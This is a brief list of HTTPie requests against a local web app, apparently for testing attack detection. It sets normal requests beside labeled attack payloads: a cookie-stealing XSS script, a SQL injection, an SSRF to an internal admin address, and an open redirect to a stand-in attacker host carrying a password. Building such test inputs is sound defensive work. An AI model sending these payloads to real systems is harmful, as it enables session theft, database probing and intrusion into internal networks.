# Normal request
http localhost:8000/Funds

# Normal request with params
http localhost:8000/ClientPositions?id=1

# XSS
http localhost:8000/ClientPositions?id="%3CSCRIPT%20TYPE=%22TEXT/JAVASCRIPT%22%3EVAR%20ADR%20=%20%27../EVIL.PHP?CAKEMONSTER=%27%20+%20ESCAPE(DOCUMENT.COOKIE);%3C/SCRIPT%3E"

# SQLi
http localhost:8000/ClientPositions?id="%27%20OR%201=CONVERT(INT,%20@@VERSION)--"

# SSRF
http POST localhost:8000/EditPosition?handler=http://192.168.0.68/admin

# Open redirect
http GET localhost:8000/EditPosition?handler=http://evil-user.net/send%3Fpwd=secret